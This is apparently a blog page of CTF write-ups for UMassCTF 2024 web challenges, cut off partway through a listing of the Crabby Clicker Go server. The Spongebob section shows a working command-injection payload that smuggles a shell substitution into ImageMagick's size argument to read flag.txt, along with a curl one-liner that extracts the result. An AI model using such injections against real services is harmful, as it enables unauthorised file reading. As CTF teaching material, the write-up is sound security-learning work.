@@ -1,0 +1,647 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>UMassCTF 2024 - web(3x) writeups - xeunwa</title><meta name="Description" content="CMD injection, HTTP, Header injection"><meta property="og:url" content="https://xeunwa.github.io/umass-ctf-2024/">
+  <meta property="og:site_name" content="xeunwa">
+  <meta property="og:title" content="UMassCTF 2024 - web(3x) writeups">
+  <meta property="og:description" content="CMD injection, HTTP, Header injection">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-04-22T02:46:00+08:00">
+    <meta property="article:modified_time" content="2024-04-22T02:46:00+08:00">
+    <meta property="article:tag" content="Header Injection">
+    <meta property="article:tag" content="Command Injection">
+    <meta property="article:tag" content="Code Review">
+    <meta property="article:tag" content="Go">
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">
+  <meta name="twitter:title" content="UMassCTF 2024 - web(3x) writeups">
+  <meta name="twitter:description" content="CMD injection, HTTP, Header injection">
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://xeunwa.github.io/umass-ctf-2024/" /><link rel="prev" href="https://xeunwa.github.io/b01lers-2024/" /><link rel="next" href="https://xeunwa.github.io/umdctf-2024/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "UMassCTF 2024 - web(3x) writeups",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/xeunwa.github.io\/umass-ctf-2024\/"
+        },"image": ["https:\/\/xeunwa.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "Header Injection, Command Injection, Code Review, Go","wordcount":  1090 ,
+        "url": "https:\/\/xeunwa.github.io\/umass-ctf-2024\/","datePublished": "2024-04-22T02:46:00+08:00","dateModified": "2024-04-22T02:46:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/avatars.githubusercontent.com\/u\/72879902?v=4"},"authors": [{
+                        "@type": "Person",
+                        "name": "xeunwa"                    
+                    }],"description": "CMD injection, HTTP, Header injection"
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('black' === 'light' || 'black' === 'dark' || 'black' === 'black') setTheme('black'), saveTheme('black'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="xeunwa"><img
+        class="logo"
+        loading="lazy"
+        src="https://avatars.githubusercontent.com/u/72879902?v=4"
+        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
+        sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
+        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/categories/ctf/"> Writeups </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/whoami/"> whoami </a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="xeunwa"><img
+        class="logo"
+        loading="lazy"
+        src="https://avatars.githubusercontent.com/u/72879902?v=4"
+        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
+        sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
+        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/categories/ctf/" title="">Writeups</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/whoami/" title="">whoami</a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#webspongebobs-homepage">web/Spongebobs Homepage</a></li>
+    <li><a href="#webcrabby-clicker">web/Crabby Clicker</a></li>
+    <li><a href="#webholesome-birthday-party">web/Holesome Birthday Party</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">UMassCTF 2024 - web(3x) writeups</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class='author'><span class="author fas fa-user-circle fa-fw"></span><span class='screen-reader-text'>  </span><a href='https://xeunwa.github.io/authors/xeunwa'>xeunwa</a></span>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-04-22">2024-04-22</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-04-22">2024-04-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1090 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#webspongebobs-homepage">web/Spongebobs Homepage</a></li>
+    <li><a href="#webcrabby-clicker">web/Crabby Clicker</a></li>
+    <li><a href="#webholesome-birthday-party">web/Holesome Birthday Party</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Writeups for solved <a href="https://ctftime.org/event/2287" target="_blank" rel="noopener noreferrer">UMassCTF 2024</a> web challenges (3/5)</p>
+<hr>
+<h1 id="webspongebobs-homepage" class="headerLink">
+    <a href="#webspongebobs-homepage" class="header-mark"></a>web/Spongebobs Homepage</h1><blockquote>
+<p>Welcome to this great website about myself! Hope you enjoy ;) DIRBUSTER or any similar tools are NOT allowed.</p>
+</blockquote>
+<p>There is a <code>#command-injection</code> in the <code>/assets/image</code> path in <code>size</code> query parameter. The size is passed on to the <strong>convert-im6.q16</strong> command. When I tried various command injection payloads, it resulted in an error.</p>
+<p><figure><a class="lightgallery" href="/umass-ctf-2024/error.png" title="Alt text" data-thumbnail="/umass-ctf-2024/error.png">
+        <img
+            
+            loading="lazy"
+            src="/umass-ctf-2024/error.png"
+            srcset="/umass-ctf-2024/error.png, /umass-ctf-2024/error.png 1.5x, /umass-ctf-2024/error.png 2x"
+            sizes="auto"
+            alt="Alt text" height="419"  width="1085" >
+    </a></figure></p>
+<p>During my tries, I wasn&rsquo;t able to escape from the current command, so I just looked for available arguments. I learned can use <code>-set</code> argument in convert-im6.q16 to set meta tags to the image. This resulted to the following payload: <code>200 -set Flag &quot;$(cat flag.txt | base64)&quot;</code>. Encoding in base64 is not really required for this challenge.</p>
+<p><code>http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=spongebob&amp;size=200%20-set%20Flag%20%22$(cat%20flag.txt%20|%20base64)%22</code></p>
+<p>We can download the image rendered and view using exiftool and decode from base64</p>
+<p><figure><a class="lightgallery" href="/umass-ctf-2024/metadata.png" title="Alt text" data-thumbnail="/umass-ctf-2024/metadata.png">
+        <img
+            
+            loading="lazy"
+            src="/umass-ctf-2024/metadata.png"
+            srcset="/umass-ctf-2024/metadata.png, /umass-ctf-2024/metadata.png 1.5x, /umass-ctf-2024/metadata.png 2x"
+            sizes="auto"
+            alt="Alt text" height="161"  width="1089" >
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s1">&#39;http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=spongebob&amp;size=200%20-set%20Flag%20%22$(cat%20flag.txt%20|%20base64)%22&#39;</span> <span class="p">|</span> exiftool - <span class="p">|</span> grep Flag <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f <span class="m">2</span> <span class="p">|</span> tr -d <span class="s1">&#39;!&#39;</span> <span class="p">|</span> xargs <span class="p">|</span> base64 -d 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag: <strong>UMASS{B4S1C_CMD_INJ3CTI0N}</strong></p>
+<hr>
+<h1 id="webcrabby-clicker" class="headerLink">
+    <a href="#webcrabby-clicker" class="header-mark"></a>web/Crabby Clicker</h1><blockquote>
+<p>I&rsquo;ve created a new game called Crabby Clicker! It&rsquo;s a fun game where you click on a crab to get points. Once you get enough points, you can buy the flag!</p>
+</blockquote>
+<p>We are given a <code>#go</code> server which apparently has bugs in it. We needed to click 100 times by sending requests to the <code>/click</code> endpoint. The bug was the state is not saved accross requests. I think doing in HTTP resets the connection so I tried doing in TCP in pwn and it worked.</p>
+<p>main.go</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;bufio&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;net&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;os&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;strings&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;time&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">RequestHandler</span> <span class="kd">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">burgers</span> <span class="kt">int</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">conn</span>    <span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">GLOBAL_STATE</span> <span class="nx">RequestHandler</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Listen on TCP port 8080 on all interfaces.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">ln</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">net</span><span class="p">.</span><span class="nf">Listen</span><span class="p">(</span><span class="s">&#34;tcp&#34;</span><span class="p">,</span> <span class="s">&#34;:1337&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Error listening:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">ln</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Listening on :1337&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">GLOBAL_STATE</span> <span class="p">=</span> <span class="nx">RequestHandler</span><span class="p">{</span><span class="nx">burgers</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">conn</span><span class="p">:</span> <span class="kc">nil</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Accept a connection.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">conn</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ln</span><span class="p">.</span><span class="nf">Accept</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Error accepting: &#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// burger to the GLOBAL_STATE from the request handler so we can track between requests
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">handler</span> <span class="o">:=</span> <span class="nx">RequestHandler</span><span class="p">{</span><span class="nx">burgers</span><span class="p">:</span> <span class="nx">GLOBAL_STATE</span><span class="p">.</span><span class="nx">burgers</span><span class="p">,</span> <span class="nx">conn</span><span class="p">:</span> <span class="nx">conn</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">go</span> <span class="nx">handler</span><span class="p">.</span><span class="nf">handleRequest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">r</span> <span class="o">*</span><span class="nx">RequestHandler</span><span class="p">)</span> <span class="nf">handleRequest</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">r</span><span class="p">.</span><span class="nx">conn</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">reader</span> <span class="o">:=</span> <span class="nx">bufio</span><span class="p">.</span><span class="nf">NewReader</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">conn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Set a deadline for reading. If a second passes without reading any data, a timeout will occur.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">r</span><span class="p">.</span><span class="nx">conn</span><span class="p">.</span><span class="nf">SetReadDeadline</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Read and parse the request headers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">request</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">readHTTPHeader</span><span class="p">(</span><span class="nx">reader</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">requestLines</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="s">&#34;\n&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">requestLines</span><span class="p">)</span> <span class="p">&lt;</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Invalid request&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Parse the request line
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">requestLine</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Fields</span><span class="p">(</span><span class="nx">requestLines</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">requestLine</span><span class="p">)</span> <span class="p">&lt;</span> <span class="mi">3</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Invalid request&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">method</span> <span class="o">:=</span> <span class="nx">requestLine</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">uri</span> <span class="o">:=</span> <span class="nx">requestLine</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Check if the request is a valid GET request
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">method</span> <span class="o">!=</span> <span class="s">&#34;GET&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">r</span><span class="p">.</span><span class="nx">conn</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;HTTP/1.1 405 Method Not Allowed\r\n\r\n&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Handle GET request
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">uri</span> <span class="o">==</span> <span class="s">&#34;/&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">r</span><span class="p">.</span><span class="nf">generateResponse</span><span class="p">(</span><span class="s">`
+</span></span></span><span class="line"><span class="cl"><span class="s">Welcome to Crabby Clicker!
+</span></span></span><span class="line"><span class="cl"><span class="s">A HTTP based clicker game where you can earn burgers to get the flag. 
+</span></span></span><span class="line"><span class="cl"><span class="s">Make a request to /click to gain a burger.
+</span></span></span><span class="line"><span class="cl"><span class="s">I use my own custom HTTP server implementation to manage the state of the game.
+</span></span></span><span class="line"><span class="cl"><span class="s">It&#39;s not fully working, I am running into some bugs.
+</span></span></span><span class="line"><span class="cl"><span class="s">			`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">uri</span> <span class="o">==</span> <span class="s">&#34;/click&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// BUG: Weird thing where the state is not updated between requests??
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nx">r</span><span class="p">.</span><span class="nx">burgers</span><span class="o">++</span>
